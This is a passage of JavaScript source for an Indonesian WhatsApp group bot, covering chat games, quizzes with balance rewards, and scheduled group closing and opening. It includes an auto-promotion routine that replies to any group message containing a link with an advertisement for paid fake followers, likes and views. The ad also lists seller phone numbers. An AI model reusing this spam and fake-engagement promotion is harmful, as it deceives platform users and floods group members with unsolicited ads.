@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
Ditss.sendMessage(from, the3, m)

delete tictactoe[from];
} else {
the4 = `@${posi.penantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.ditantang.split('@')[0]}`
Ditss.sendMessage(from, the4, m)

tictactoe[from].status = false
}
}
}
}
} else if (posi.status === false){
if (sender === posi.ditantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '⭕' 
if (cekTicTac(anu)){
the5 = `@${posi.ditantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
Ditss.sendMessage(from, the5, m)
users[posi.ditantang].balance += posi.hadiah
users[posi.penantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the6 = `Hasil Seri

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
Ditss.sendMessage(from, the6, m)

delete tictactoe[from];
} else {
the7 = `@${posi.ditantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
Ditss.sendMessage(from, the7, m)

tictactoe[from].status = true
}
}
}
}
}
}
} catch (err){
console.log(chalk.redBright('[ ERROR TICTACTOE ]'), err)
}
}

// FUNCTION SUIT PVP POLLING 
let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
minSaldo(m.sender, 1000, db_saldo)
pokl = `@${roof.p2.split('@')[0]} menolak suit, suit dibatalkan\nDan player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await Ditss.sendMessage(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

@${roof.p.split('@')[0]} dan @${roof.p2.split('@')[0]}

Silahkan pilih suit di chat masing"
klik wa.me/${botNumber.split('@')[0]}`
await Ditss.sendMessage(from, ggy, fkontak2)
if (!roof.pilih) await Ditss.sendPoll(roof.p, teksbbb, [`batu`,`kertas`,`gunting`, ])
if (!roof.pilih2) await Ditss.sendPoll(roof.p2, teksbbb, [`batu`,`kertas`,`gunting`, ])
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await Ditss.sendMessage(from, {text: `Kedua pemain tidak niat main,\nSuit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
minSaldo(m.sender, 1000, db_saldo)
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir\nDan Player dikenakan sanksi pengurangan Rp. 1,000 saldo karna menolak ajakan pemain`
await Reply(sffp)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = sender == roof.p
let jwb2 = sender == roof.p2
let g = /.gunting/i
let b = /.batu/i
let k = /.kertas/i
let reg = /^(.gunting|.batu|.kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(body.toLowerCase())[0]
roof.text = body
await Ditss.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:m})
if (!roof.pilih2) await Ditss.sendMessage(roof.p2, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(body.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await Ditss.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await Ditss.sendMessage(roof.p, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await Ditss.sendMessage(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} *${roof.text}* ${tie ? '' : roof.p == win ? ' Menang' : ' Kalah'}\n@${roof.p2.split('@')[0]} *${roof.text2}* ${tie ? '' : roof.p2 == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah Saldo : 2,000 '}`, f1('HASIL SUIT PVP', null))
if (roof.p == win) {
roof.p == win ? minSaldo(users[roof.p], 2000, db_saldo) : minSaldo(users[roof.p], 1000, db_saldo)
} else if (roof.p2 == win) {
roof.p2 == win ? addSaldo(users[roof.p2], 2000, db_saldo) : minSaldo(users[roof.p2], 1000, db_saldo)
}
delete suit[roof.id]
}
}


// FUNCTION PETAK BOMB 
let pilih = "🌀", bomb = "💣";
if (sender in petakbom) {
if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 1) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 2) {
petakbom[sender].board[parseInt(body) - 1] = bomb;
petakbom[sender].pick++;
Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
petakbom[sender].bomb--;
petakbom[sender].nyawa.pop();

let brd = petakbom[sender].board;
if (petakbom[sender].nyawa.length < 1) {
await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Pengurangan Saldo :* Rp. 100`);
Ditss.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
minSaldo(sender, 100, db_saldo)
delete petakbom[sender];
} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join("")}\n\nTerpilih: ${petakbom[sender].pick}\nSisa nyawa: ${petakbom[sender].nyawa}`);
return !0;
}
if (petakbom[sender].petak[parseInt(body) - 1] === 0) {
petakbom[sender].petak[parseInt(body) - 1] = 1;
petakbom[sender].board[parseInt(body) - 1] = pilih;
petakbom[sender].pick++;
petakbom[sender].lolos--;
let brd = petakbom[sender].board;
if (petakbom[sender].lolos < 1) {
await m.reply(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Sisa nyawa :* ${petakbom[sender].nyawa}\n*Bomb :* ${petakbom[sender].bomb}\n*Hadiah Saldo :* Rp. 250`);
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
addSaldo(q.split(`250`)[0]+"@s.whatsapp.net", Number(q.split(`${m.sender}`)[1]), db_saldo)
delete petakbom[sender];
} else m.reply(`*PILIH ANGKA*\n\n${brd.join("")}\n\nTerpilih : ${petakbom[sender].pick}\nSisa nyawa : ${petakbom[sender].nyawa}\nBomb : ${petakbom[sender].bomb}`)
}
}
// GAME TEBAK GAMBAR 

if ((from in tebakgambar)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${tebakgambar[from].jawaban}*`);
delete tebakgambar[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 150`);
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
//addSaldo(m.sender, 150, db_saldo)
clearTimeout(waktu);
delete tebakgambar[from];
} else Ditss.sendMessage(sender, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK ANIME 
if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakanime[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakanime[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK LAGU 
if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklagu[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebaklagu[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS 
if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete kuis[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete kuis[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SIAPAKAH AKU 
if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete siapakahaku[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete siapakahaku[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KALIMAT 
if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkalimat[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete tebakkalimat[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KATA 
if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n\n*Game :* Tebak Kata\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete tebakkata[from];
} else await Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK LIRIK 
if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklirik[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebaklirik[from];
} else await Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KIMIA 
if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkimia[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete tebakkimia[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK BENDERA 
if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakbendera[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakbendera[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME ASAH OTAK 
if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete asahotak[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete asahotak[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SUSUN KATA 
if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete susunkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete susunkata[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME CAK LONTONG 
if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete caklontong[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete caklontong[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS MATH 
if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete kuismath[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete kuismath[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME FAMILY 100 
if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (budy.toLowerCase() == "nyerah") {
await m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 0`);
delete family100[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}\n*Hadiah Saldo :* Rp. 200`);
//addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete family100[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}

// FUNCTION 
 async function sendPoll(jid, text, list) {
Ditss.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}
        //p
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
// FUNCTION SUIT PVP POLLING 


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Ditss.sendMessage(m.chat, {text: `
*Cann Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*👤 Contact Cann*
* *WhatsApp Utama :*
+6285866435726
* *WhtasApp Cadangan :*
+6285692195658
https://t.me/@lynnwak
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return Ditss.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnail: fs.readFileSync("./src/media/reply.jpg"), 
sourceUrl: null, 
}}}, {quoted: null})
}

// FUNCTION MESSAGE
const reploy = async(id, teks) => Ditss.sendMessage(id, {text: teks, mentions: await ments(teks), contextInfo: {mentionedJid: await ments(teks), externalAdReply: {showAdAttribution: false, title: `${salam} ${pushname}`, body: fake, mediaType: 1, previewType: 'PHOTO', thumbnail: ppuser, sourceUrl: global.idgc }}}, {quoted: global.f1('[ System Notice ]', ppuser)})
const onlyGroup = async() => {
let joinbang = `Hallo ${tag}, untuk menggunakan semua fitur *asuma*, harap masukan bot ke group anda terlebih dahulu agar anda dapat akses lebih di dalam group gratis tanpa prabayar\n\nAtau anda bisa membeli akses sewa & premium dari owner`
Reply(joinbang)}
const onlyOwner = async() => {Reply(global.mess.owner)};
const onlyAdmin = async() => {Reply(global.mess.admin)};
const onlyGc = async() => {reply(global.mess.group)};
const botAdmin = async() => {Reply(global.mess.botAdmin)};
const onlyWait = async() => {Reply(global.mess.wait)};
        //bats
                global.db.menfess = global.db.menfess ? global.db.menfess : {}
         let mf = Object.values(global.db.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return Reply(`Balas Pesan Menfess Mu Di Private Chat`)
            if (!/conversation|extended/.test(m.mtype)) return Reply(`Balas dengan teks biasa.`)
            let text = `😄 Hai kak, kamu menerima pesan balasan nih dari ${mf.receiver.split('@')[0]} pesannya : *${body}*`
            await Ditss.sendMessage(mf.from, { text: text }).then(async () => {
               Reply(`Berhasil Terkirim!!`)
               await sleep(1000)
               delete global.db.menfess[mf.id]
               return !0
            })
         }     
         
// PENGALIH
if (isCmd && isBanned) return m.reply('anda di banned oleh owner')

        
/*let regex =[ "Kym","menu","rpg","download","game","nsfw","search","tools","deposit","topup","jadibot","fun","shop","bot","play","start","afk"]
for (let i of regex){
if (m.isGroup && budy.toLowerCase().includes(i)){
let emot = await pickRandom(["🗿", "🗿", "🦚", "👶🏿", "👍", "🙄", "🌚", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "👩‍⚕️", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
Ditss.sendMessage(from, { react: { text: emot, key: m.key } })
}
}*/
// FUNCTION TIME AUTO CLOSE MAGHRIB
cron.schedule('0 0 18 * * *', async () => {
const getGroups = await Ditss.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
Ditss.sendMessage(from, {text: '*[ System Notice ]* Segeralah Beribadah...'});
if (groups.some(v => v === from) && !(await Ditss.groupMetadata(from)).announce) {
Ditss.groupSettingUpdate(from, 'announcement').then(() => Ditss.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })
cron.schedule('0 0 19 * * *', async () => {
const getGroups = await Ditss.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Waktu maghrib usai, group dibuka kembali.'
if (groups.some(v => v === from) && (await Ditss.groupMetadata(from)).announce) {
Ditss.groupSettingUpdate(from, 'not_announcement');
Ditss.sendMessage(from, {text: text, mentions: Object.values(global.db.groups[from].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
Ditss.groupRequestParticipantsList(from).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await Ditss.groupRequestParticipantsUpdate(from, [i.jid], 'approve')
await sleep(1000)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

// FUNCTION TIDUR
cron.schedule('0 0 23 * * *', async () => {
const getGroups = await Ditss.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
let imejnya = getBuffer('https://telegra.ph/file/3686f3e8dbe085a7b20fe.png')
let tidurnya = await Ditss.downloadAndSaveMediaMessage(imejnya, + new Date * 1)
Ditss.imgToSticker(from, tidurnya, m, {packname: packname, author: global.author});
if (groups.some(v => v === from) && !(await Ditss.groupMetadata(from)).announce) {
Ditss.groupSettingUpdate(from, 'announcement').then(() => Ditss.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

// FUNCTION MORNING TIME 

cron.schedule("0 0 4 * * *", () => {
Ditss.sendMessage(m.chat, { text : '*[ System Notice ]* Bangunnnn!! udah shubuhh (─.─||）', mentions: participants.map(a => a.id)})
}, {scheduled: true, timezone: "Asia/Jakarta"});

cron.schedule('0 0 22 * * *', async () => {
const getGroups = await Ditss.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
Ditss.sendMessage(from, {text: '*[ System Notice ]* Tidur manis (ー_ー゛)'});
if (groups.some(v => v === from) && !(await Ditss.groupMetadata(from)).announce) {
Ditss.groupSettingUpdate(from, 'announcement').then(() => Ditss.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 6 * * *', async () => {
const getGroups = await Ditss.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Sistem secara otomatis membuka grup ini karena pagi hari.'
if (groups.some(v => v === from) && (await Ditss.groupMetadata(from)).announce) {
Ditss.groupSettingUpdate(from, 'not_announcement');
Ditss.sendMessage(from, {text: text, mentions: Object.values(global.db.groups[from].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
Ditss.groupRequestParticipantsList(from).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await Ditss.groupRequestParticipantsUpdate(from, [i.jid], 'approve')
await sleep(1000)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })      
        //aku 
const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/logo.jpg") }, { upload: Ditss.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*Ditss* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Dits Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*
* Ram 1GB : Rp1000
* Ram 2 GB : Rp2000
* Ram 3 GB : Rp3000
* Ram 4 GB : Rp4000
* Ram 5 GB : Rp5000
* Ram 6 GB : Rp6000
* Ram 7 GB : Rp7000
* Ram 8 GB : Rp8000
* Ram 9 GB : Rp9000
* Ram Unlimited : Rp10.000
*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
